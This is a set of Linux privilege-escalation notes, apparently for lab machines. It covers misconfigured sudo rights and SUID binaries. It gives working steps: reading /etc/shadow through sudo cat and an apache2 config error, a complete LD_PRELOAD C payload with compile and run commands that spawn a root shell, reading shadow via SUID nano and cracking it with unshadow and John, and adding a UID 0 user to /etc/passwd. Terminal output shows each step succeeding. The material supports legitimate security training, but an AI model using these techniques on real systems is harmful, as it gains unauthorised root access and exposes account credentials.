# Linux Privilege Escalation Notes

Notes on common Linux privilege escalation vectors involving misconfigured `sudo` permissions and SUID/SGID binaries.

## Table of Contents

- [Sudo Privilege Escalation](#sudo-privilege-escalation)
  - [Basic Sudo Escalation](#basic-sudo-escalation)
  - [Leverage Application Functions](#leverage-application-functions)
  - [Leverage LD_PRELOAD](#leverage-ld_preload)
- [SUID/SGID Privilege Escalation](#suidsgid-privilege-escalation)
  - [Finding SUID/SGID Binaries](#finding-suidsgid-binaries)
  - [Exploiting Nano with SUID](#exploiting-nano-with-suid)
  - [Reading the /etc/shadow File](#reading-the-etcshadow-file)
  - [Replacing the Root User](#replacing-the-root-user)

---

# Sudo Privilege Escalation

---

## Basic Sudo Escalation

Any user can check their current situation related to root privileges using the `sudo -l` command. The output looks similar to the following example:

```bash
john@sudo-box:~$ sudo -l
Matching Defaults entries for labuser on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User labuser may run the following commands on target:
    (ALL) NOPASSWD: /bin/cat
```

In this case, the user can run `/bin/cat` as root, meaning they can read any file as root. For example, reading `/etc/shadow` will show the password hashes of other users, which can then be cracked offline.

---

## Leverage Application Functions

Some applications will not have a known exploit within this context. One such application is the Apache2 server.

In this case, you can use a "hack" to leak information by leveraging a function of the application. Apache2 has an option that supports loading alternative configuration files (`-f`: specify an alternate `ServerConfigFile`).

```bash
john@sudo-box:~$ apache2 -h
Usage: apache2 [-D name] [-d directory] [-f file]
               [-C "directive"] [-c "directive"]
               [-k start|restart|graceful|graceful-stop|stop]
               [-v] [-V] [-h] [-l] [-L] [-t] [-S] [-X]
Options:
  -D name           : define a name for use in <IfDefine name> directives
  -d directory      : specify an alternate initial ServerRoot
  -f file           : specify an alternate ServerConfigFile
  -C "directive"    : process directive before reading config files
  -c "directive"    : process directive after reading config files
  -e level          : show startup errors of level (see LogLevel)
  -E file           : log startup errors to file
  -v                : show version number
  -V                : show compile settings
  -h                : list available command line options (this page)
  -l                : list compiled in modules
```

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file. Since that is the root line, it will effectively leak the root hash, which can be cracked offline.

On Ubuntu, the command is:

```bash
sudo apache2 -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" -f /etc/shadow
```

---

## Leverage LD_PRELOAD

On some systems, you may see the `LD_PRELOAD` environment option enabled in the sudoers configuration.

```bash
john@sudo-box:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
User john may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
```

`LD_PRELOAD` allows any program to load shared libraries before it runs. If the `env_keep` option is enabled, you can generate a shared library that will be loaded and executed before the target program runs.

> **Note:** `LD_PRELOAD` is ignored if the real user ID differs from the effective user ID.

### Steps

1. Check for `LD_PRELOAD` (with the `env_keep` option) via `sudo -l`.
2. Write a simple C program compiled as a shared object (`.so`) file.
3. Run an allowed sudo program with the `LD_PRELOAD` option pointing to the `.so` file.

### C Code Example

Save the following as `shell.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

### Compile

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```bash
john@sudo-box:~$ cat shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
john@sudo-box:~$ ls
shell.c
john@sudo-box:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
john@sudo-box:~$ ls
shell.c  shell.so
```

### Execute

Run any program allowed via sudo (e.g., `apache2`, `find`) with the `LD_PRELOAD` option set to the compiled `.so` file:

```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This spawns a root shell.

```bash
john@sudo-box:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
john@sudo-box:~$ whoami
user
john@sudo-box:~$ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
root@sudo-box:/home/john# id
uid=0(root) gid=0(root) groups=0(root)
root@sudo-box:/home/john# whoami
root
```

---

## Summary

The `LD_PRELOAD` technique is a relatively rare case. More commonly, simpler sudo privilege escalation vectors will be available. In general, if a target machine's user has been assigned sudo permissions on certain binaries, one of the techniques above can often be used to escalate privileges.

---

# SUID/SGID Privilege Escalation

Many Linux privilege controls rely on controlling interactions between users and files through permissions. Files typically have read, write, and execute permissions assigned within a user's privilege level. This changes with **SUID** (Set-User Identification) and **SGID** (Set-Group Identification) bits.

- **SUID** allows a file to be executed with the permission level of the file **owner**.
- **SGID** allows a file to be executed with the permission level of the file's **group owner**.

Files with these bits set show an `s` in their permission string (e.g., `-rwsr-xr-x`), indicating the special permission level. This means the program runs with the effective UserID (or GroupID) of the binary's owner, rather than the user who invoked it.

## Finding SUID/SGID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Example output:

```bash
john@suid-box:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Feb 15  2011 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517   12 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473326  188 -rwsr-xr-x   1 root     root       188328 Apr 15  2010 /bin/nano  (Note: this normally doesn't have SUID)
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
```

A good practice is to compare listed executables against [GTFOBins](https://gtfobins.github.io/), which maintains a curated, filterable list of Unix binaries known to be exploitable when the SUID bit is set. A pre-filtered SUID list is available at [gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid).

> **Note:** Target systems may have additional SUID binaries beyond common/expected ones (like `nano`, which normally does not have SUID set). Always enumerate thoroughly rather than assuming.

## Exploiting Nano with SUID

If `nano` has the SUID bit set and is owned by `root`, it can be used to create, edit, and read files with root's privilege level. From here there are two common paths:

1. Reading `/etc/shadow` to crack password hashes offline.
2. Adding a new privileged user to `/etc/passwd`.

## Reading the /etc/shadow File

With SUID set on `nano`:

```bash
nano /etc/shadow
```

This prints the contents of `/etc/shadow`. Combined with `/etc/passwd`, the `unshadow` tool can generate a file crackable by John the Ripper:

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

```bash
john@suid-box:~$ unshadow passwd.txt shadow.txt > passwords.txt
Created directory /home/user/.john
```

With the correct wordlist, John the Ripper can potentially recover one or more passwords in cleartext.

## Replacing the Root User

An alternative to password cracking is adding a new user with root privileges directly to `/etc/passwd`.

### 1. Generate a password hash

```bash
openssl passwd -1 -salt THM password1
```

```bash
john@suid-box:~$ openssl passwd -1 -salt THM password1
$1$THM$WnbwlliCqxFRQepUTCkUT1
```

### 2. Add the user to /etc/passwd (via the SUID nano)

Append a line using UID/GID `0` and `/bin/bash` as the shell to grant a root shell:

```
hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
```

### 3. Switch to the new user

```bash
john@suid-box:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
john@suid-box:~$ whoami
john
john@suid-box:~$ su hacker
Password:
root@suid-box:~# id
uid=0(root) gid=0(root) groups=0(root)
root@suid-box:~# whoami
root
```

## Summary

The SUID/SGID bit set on binaries like `nano` allows file operations to run with the file owner's privilege level. Checking discovered SUID/SGID binaries against GTFOBins is a fast way to identify a viable escalation path — often requiring an intermediate step (like editing `/etc/passwd` or reading `/etc/shadow`) rather than a direct shell.

## References

- [GTFOBins](https://gtfobins.github.io/) — a curated list of Unix binaries that can be exploited for privilege escalation.
